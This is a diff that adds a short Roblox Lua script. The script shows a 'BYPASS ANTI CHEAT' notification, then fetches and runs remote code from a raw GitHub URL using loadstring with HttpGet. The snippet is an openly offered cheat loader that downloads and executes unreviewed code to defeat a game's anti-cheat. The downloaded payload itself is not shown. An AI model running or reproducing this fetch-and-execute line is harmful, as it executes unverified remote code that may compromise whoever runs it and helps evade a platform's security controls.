@@ -1,0 +1,7 @@
+game.StarterGui:SetCore("SendNotification",{
+            Title = "BYPASS ACTIVED",
+            Text = "BYPASS ANTI CHEAT ENABLE",
+            Duration = 2
+        })
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/44oo/Saad-scripts/main/BYPASS%20V1"))()
